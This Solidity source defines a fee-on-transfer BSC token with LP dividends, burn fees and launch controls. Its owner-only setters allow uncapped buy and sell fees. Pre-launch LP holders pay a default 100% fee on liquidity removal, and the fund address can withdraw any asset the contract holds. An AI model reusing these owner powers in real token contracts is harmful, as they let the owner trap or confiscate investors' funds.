// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function kLast() external view returns (uint);

}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {

    struct UserInfo {
        uint256 lpAmount;
        bool preLP;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public fundAddress_2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;
    mapping(address => UserInfo) private _userInfo;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 200;
    uint256 public _buyLPFee = 0;
    uint256 public _buyLPDividendFee = 200;

    uint256 public _sellFundFee = 1200;
    uint256 public _sellLPFee = 0;
    uint256 public _sellLPDividendFee = 200;
    uint256 public _maxWalletAmount;


    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address _Fund, address _Fund_2, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;

        _swapRouter = swapRouter;
        _swapRouters[address(swapRouter)] = true;

        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = 30 * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = 0;

        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = _Fund;
        fundAddress_2 = _Fund_2;

        _feeWhiteList[_Fund] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 10 ** IERC20(USDTAddress).decimals()/10**10;
        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function setMaxWalletAmount(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmount = newValue;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    bool public antiSYNC = true;
    function setAntiSYNCEnable(
        bool s
    ) public onlyOwner{
        antiSYNC = s;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {require(_balances[_mainPair] > 0,"!sync");}
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 0;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    function setBuy(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _buyFundFee = newFund;
        _buyLPFee = newLp;
        _buyLPDividendFee = newLpDividend;
    }

    function setSell(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _sellFundFee = newFund;
        _sellLPFee = newLp;
        _sellLPDividendFee = newLpDividend;
    }

    function tradingOpen() public view returns(bool){
        return block.number >= startTradeBlock && startTradeBlock != 0;
    }

    mapping(address => bool) public _swapRouters;
    function setSwapRouter(address addr, bool enable) external onlyOwner {
        _swapRouters[addr] = enable;
    }

    bool public _strictCheck = true;
    function setStrictCheck(bool enable) external onlyOwner{
        _strictCheck = enable;
    }

    function updateLPAmount(address account, uint256 lpAmount) public onlyOwner {
        _userInfo[account].lpAmount = lpAmount;
    }

    function getUserInfo(address account) public view returns (
        uint256 lpAmount, uint256 lpBalance, bool excludeLP, bool preLP
    ) {
        lpAmount = _userInfo[account].lpAmount;
        lpBalance = IERC20(_mainPair).balanceOf(account);
        excludeLP = excludeHolder[account];
        UserInfo storage userInfo = _userInfo[account];
        preLP = userInfo.preLP;
    }

    function initLPAmounts(address[] memory accounts, uint256 lpAmount) public onlyOwner {
        uint256 len = accounts.length;
        UserInfo storage userInfo;
        for (uint256 i; i < len;) {
            userInfo = _userInfo[accounts[i]];
            userInfo.lpAmount = lpAmount;
            userInfo.preLP = true;
            addHolder(accounts[i]);
        unchecked{
            ++i;
        }
        }
    }
    
    function _strictCheckBuy(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther < rOther) {
            liquidity = (amount * ISwapPair(_mainPair).totalSupply()) /
            (_balances[_mainPair] - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = amount * rOther / (rThis - amount);
                //strictCheckBuy
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    function _isRemoveLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity = amount * ISwapPair(_mainPair).totalSupply() / 
            (balanceOf(_mainPair) - amount);
        }
    }

    function _isRemoveLiquidity_2(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity = (amount * ISwapPair(_mainPair).totalSupply() + 1) /
            (balanceOf(_mainPair) - amount - 1);
        }
    }

    uint256 public checkRemoveMode = 1;
    function changeCheckRemoveMode(
        uint256 newValue
    ) public onlyOwner {
        checkRemoveMode = newValue;
    }

    // bool public firstBuy = false;
    // function setFirstBuyEnable(
    //     bool status
    // ) public onlyOwner{
    //     firstBuy = status;
    // }

    mapping(address=>bool) public firstBuyList;
    function setFirstBuyList(
        address[] calldata addresses,
        bool s
    ) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            firstBuyList[addresses[i]] = s;
        }
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;

        if(!_feeWhiteList[from] && !_feeWhiteList[to] && airDropNumbs > 0){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        if (!_feeWhiteList[from] && !_feeWhiteList[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(tradingOpen());
        }

        bool isRemove;
        bool isAdd;
        UserInfo storage userInfo;

        uint256 addLPLiquidity;
        if (
            _swapPairList[to] &&
            _swapRouters[msg.sender]
        ) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0 && !isContract(from)) {
                userInfo = _userInfo[from];
                userInfo.lpAmount += addLPLiquidity;
                isAdd = true;
                if (0 == startTradeBlock) {
                    userInfo.preLP = true;
                }
            }
        }
        
        uint256 removeLPLiquidity;
        if(
            _swapPairList[from] &&
            to != address(_swapRouter)
        ) {
           if (_strictCheck) {
                removeLPLiquidity = _strictCheckBuy(amount);
            } else {
                if (checkRemoveMode == 1){
                    removeLPLiquidity = _isRemoveLiquidity(amount);
                }else{
                    removeLPLiquidity = _isRemoveLiquidity_2(amount);
                }
            }

            if (removeLPLiquidity > 0) {
                require(_userInfo[to].lpAmount >= removeLPLiquidity);
                _userInfo[to].lpAmount -= removeLPLiquidity;
                isRemove = true;
            }

        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (!tradingOpen()){
                    if (!firstBuyList[to]) {
                        require(0 < goAddLPBlock && isAdd, "!goAddLP"); //_swapPairList[to]
                    }
                }

                if (_swapPairList[from]) {
                    require(_maxWalletAmount == 0 || amount + balanceOf(to) <= _maxWalletAmount, "ERC20: > max wallet amount");
                }

                if (_swapPairList[to]) {
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                if (!isAdd && !isRemove) takeFee = true; // just swap fee
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        if (
            !_swapPairList[from] &&
            !_swapPairList[to] &&
            !_feeWhiteList[from] &&
            !_feeWhiteList[to]
        ) {
            isSell = true;
            takeFee = true;
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            isSell,
            isAdd,
            isRemove
        );

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }else if(_swapPairList[from] && IERC20(_mainPair).balanceOf(to) > 0){
                addHolder(to);
            }
            processReward(500000);
        }
    }

    function _getReserves() public view returns (uint256 rOther, uint256 rThis, uint256 balanceOther) {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    function _isAddLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = amount * rOther / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity,) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply * (rootK - rootKLast) * 8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    uint256 public buy_burnFee = 100;
    uint256 public sell_burnFee = 100;
    function setBurnFee(uint256 newBuyBurn, uint256 newSellBurn) public onlyOwner{
        buy_burnFee = newBuyBurn;
        sell_burnFee = newSellBurn;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isAdd,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }

            uint256 burnAmount;
            if (!isSell) {
                //buy
                burnAmount = (tAmount * buy_burnFee) / 10000;
            } else {
                //sell
                burnAmount = (tAmount * sell_burnFee) / 10000;
            }
            if (burnAmount > 0 && balanceOf(address(0xdead)) < 1020 * 10**18 ) {
                feeAmount += burnAmount;
                _takeTransfer(sender, address(0xdead), burnAmount);
            }
        }

        if (isAdd && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
            uint256 addLiquidityFeeAmount;
            addLiquidityFeeAmount = (tAmount * getAddlpFee()) / 10000;

            if (addLiquidityFeeAmount > 0) {
                feeAmount += addLiquidityFeeAmount;
                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
            }
        }

        if (isRemove && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
            if (_userInfo[recipient].preLP) {
                uint256 removeLiquidityFeeAmount;
                removeLiquidityFeeAmount = (tAmount * getRemovelpFee()) / 10000;

                if (removeLiquidityFeeAmount > 0) {
                    feeAmount += removeLiquidityFeeAmount;
                    _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);
                }
            }
        }


        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    address  public _removeLPFeeReceiver = address(0xdead);
    function setRemoveLPFeeReceiver(address d) external onlyOwner {
        _removeLPFeeReceiver = d;
    }

    uint256 public addLiquidityFee;
    uint256 public removeLiquidityFee = 10000;

    function setAddLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "add Lp > 100 !");
        addLiquidityFee = newValue;
    }

    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "remove Lp> 100 !");
        removeLiquidityFee = newValue;
    }

    function getAddlpFee() public view returns(uint256){
        return addLiquidityFee;
    }

    function getRemovelpFee() public view returns(uint256){
        return removeLiquidityFee;
    }

    event FAILED_SWAP(uint256);
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_usdt);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        if (fundAmount > 0){
            uint256 half_fund = fundAmount * 2 / 3;
            FIST.transferFrom(address(_tokenDistributor), fundAddress, half_fund);
            FIST.transferFrom(address(_tokenDistributor), fundAddress_2, fundAmount - half_fund);
        }
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, fundAddress_2, block.timestamp
                ) {} catch { emit FAILED_SWAP(1); }
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundAddress_2(address addr) external onlyOwner {
        fundAddress_2 = addr;
        _feeWhiteList[addr] = true;
    }

    uint256 public goAddLPBlock;
    function addLPBegin() external onlyOwner {
        require(0 == goAddLPBlock, "startedAddLP");
        goAddLPBlock = block.number;
    }

    function addLPEnd() external onlyOwner {
        goAddLPBlock = 0;
    }

    uint256 public startTradeBlock;
    function launch(bool s) external onlyOwner {
        if (s){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
        
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setClaims(address token, uint256 amount) external {
        if (msg.sender == fundAddress){
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                IERC20(token).transfer(msg.sender, amount);
            }
        }
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function setWLs(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = status;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    uint256 public holderCondition = 10**18 / 10;
    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount;
    }

    uint256 public processRewardWaitBlock = 1;
    function setProcessRewardWaitBlock(uint256 newValue) public onlyOwner{
        processRewardWaitBlock = newValue;
    }

    event LP_dividend_successful(
        address,
        uint256
    );

    event LP_dividend_failed(
        address,
        uint256
    );
    

    function processReward(uint256 gas) private {
        if (progressRewardBlock + processRewardWaitBlock > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_usdt);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;


        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    uint256 tokenHold = balanceOf(shareHolder);
                    if (tokenHold >= holdCondition){
                        FIST.transfer(shareHolder, amount);
                        emit LP_dividend_successful(
                            shareHolder,
                            tokenHold
                        );
                    }else{
                        emit LP_dividend_failed(
                            shareHolder,
                            tokenHold
                        );
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "test 1020",
        "test 1020",
        18,
        10200,
        address(0x9F2A3822Dd6926F30FaA865493d2DE6F24772f9D),
        address(0x9F2A3822Dd6926F30FaA865493d2DE6F24772f9D),
        address(0x9F2A3822Dd6926F30FaA865493d2DE6F24772f9D) //receiver
    ){
    }
}